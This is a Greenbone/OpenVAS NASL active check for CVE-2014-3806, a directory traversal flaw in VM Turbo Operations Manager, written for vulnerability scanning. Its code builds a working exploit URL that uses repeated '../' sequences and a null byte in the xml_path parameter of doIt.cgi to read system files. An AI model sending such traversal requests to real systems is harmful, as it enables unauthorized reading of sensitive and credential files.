# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804448");
  script_version("2025-08-21T05:40:06+0000");
  script_tag(name:"last_modification", value:"2025-08-21 05:40:06 +0000 (Thu, 21 Aug 2025)");
  script_tag(name:"creation_date", value:"2014-05-09 14:42:04 +0530 (Fri, 09 May 2014)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2014-3806");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("VM Turbo Operations Manager < 4.6 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Turbo Operations Manager is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed to the 'xml_path' parameter in
  '/cgi-bin/help/doIt.cgi' is not properly sanitised before being used to get the contents of a
  resource.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"VM Turbo Operations Manager version 4.5.x and prior.");

  script_tag(name:"solution", value:"Update to version 4.6 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/532061");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67292");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/vm-turbo-operations-manager-45x-directory-traversal");
  script_xref(name:"URL", value:"https://support.vmturbo.com/hc/en-us/articles/203170127-VMTurbo-Operations-Manager-v4-6-Announcement");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("os_func.inc");
include("port_service_func.inc");
include("traversal_func.inc");

port = http_get_port(default: 80);

foreach dir (make_list_unique("/", "/VMTurbo", "/manager", "/operation-manager", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/help/index.html";

  res = http_get_cache(port: port, item: url);
  if (!res || res !~ "^HTTP/1\.[01] 200" || ">VMTurbo Operations Manager" >!< res)
    continue;

  files = traversal_files();

  foreach pattern (keys(files)) {
    url = dir + "/help/doIt.cgi?FUNC=load_xml_file&amp;xml_path=" + crap(data: "../", length: 3 * 15) +
          files[pattern] + "%00";

    if (http_vuln_check(port: port, url: url, check_header: TRUE, pattern: pattern)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
